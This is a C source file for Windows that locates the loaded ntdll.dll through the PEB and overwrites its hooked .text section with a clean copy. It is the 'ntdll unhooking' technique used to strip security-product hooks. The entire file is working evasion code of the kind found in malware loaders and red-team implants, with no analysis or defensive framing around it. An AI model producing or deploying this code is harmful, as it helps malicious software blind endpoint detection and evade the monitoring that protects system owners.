#include <windows.h>
#include <stdio.h>
#include <winternl.h> // used to have defination for PPEB


PVOID FetchLocalNtdllBase()
{

    // Read PEB Address from the TEB segment register
#ifdef _WIN64
    PPEB pPeb = (PPEB)__readgsqword(0x60);
#elif _WIN32
    PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif

    // Going 2nd in the list because ntdll is the second module that loads
    PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);

    return pLdr->DllBase;

}

BOOL UnhookNtdll(IN PVOID pCleanNtdll, IN BOOL bIsMapped)
{
    // get the hooked ntdll base directly from PEB
    PVOID pLocalNtdll = FetchLocalNtdllBase();

    // Validate DOS Header
    PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)pLocalNtdll;
    if (pDosHdr->e_magic != IMAGE_DOS_SIGNATURE ) return FALSE;

    // Validate NT Headers
    PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)pLocalNtdll + pDosHdr->e_lfanew);
    if ( pNtHdrs->Signature != IMAGE_NT_SIGNATURE ) return FALSE;

    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHdrs);

    for (int i = 0; i < pNtHdrs->FileHeader.NumberOfSections; i++)
    {

        // Compare section name - bitmask trick for case-insenstive ".text" match
        if ((*(ULONG*)pSection[i].Name | 0x20202020) == 'xet.')
        {

            // Hooked .text always at VirtualAddress (its loaded in memory)
            PVOID pHookedTxt = (PVOID)((ULONG_PTR)pLocalNtdll + pSection[i].VirtualAddress);

            DWORD dwOffset = bIsMapped ? pSection[i].VirtualAddress : pSection[i].PointerToRawData;
            PVOID pCleanTxt = (PVOID)(ULONG_PTR)pCleanNtdll + dwOffset;

            SIZE_T sTxtSize = pSection[i].Misc.VirtualSize;

            printf("[i] Hooked .text : 0x%p \n", pHookedTxt);
            printf("[i] Clean .text : 0x%p \n", pCleanTxt);
            printf("[i] Size : %llu bytes \n", (unsigned long long)sTxtSize);

            // Make hooked .text writeable so we can overwrite it
            DWORD dwOldProtect = 0;
            if (!VirtualProtect(pHookedTxt, sTxtSize, PAGE_EXECUTE_WRITECOPY, &dwOldProtect)) {
                printf("[!] VirtualProtect [1] Failed: %d \n", GetLastError());
                return FALSE;
            }

            // overwrite hooked bytes with clean bytes
            memcpy(pHookedTxt, pCleanTxt, sTxtSize);

            if ( !VirtualProtect(pHookedTxt, sTxtSize, dwOldProtect, &dwOldProtect) )
            {
                printf("[!] VirtualProtect [2] Failed: %d \n", GetLastError());
                return FALSE;
            }

            printf("[+] .text replacted \n");
            return TRUE;
        }
    }

    printf("[!] .text section not found \n");
    return FALSE;
}